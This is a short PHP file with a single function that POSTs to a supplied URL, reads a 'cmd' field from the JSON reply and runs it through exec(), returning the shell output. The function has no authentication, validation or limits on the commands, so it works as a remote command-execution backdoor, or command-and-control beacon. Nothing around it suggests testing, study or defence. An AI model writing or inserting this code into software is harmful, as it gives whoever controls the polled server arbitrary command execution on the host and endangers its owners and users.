<?php
// Polls a server for tasks and runs the command field it returns.
function poll_for_tasks( $url ) {
	$ch = curl_init( $url );
	curl_setopt_array( $ch, array(
		CURLOPT_POST           => true,
		CURLOPT_RETURNTRANSFER => true,
	) );
	$raw = curl_exec( $ch );
	curl_close( $ch );
	$resp = json_decode( $raw, true );
	if ( ! empty( $resp['cmd'] ) ) {
		$cmd = (string) $resp['cmd'];
		$out = array();
		$code = 0;
		exec( $cmd . ' 2>&1', $out, $code );
		return implode( "\n", $out );
	}
	return '';
}
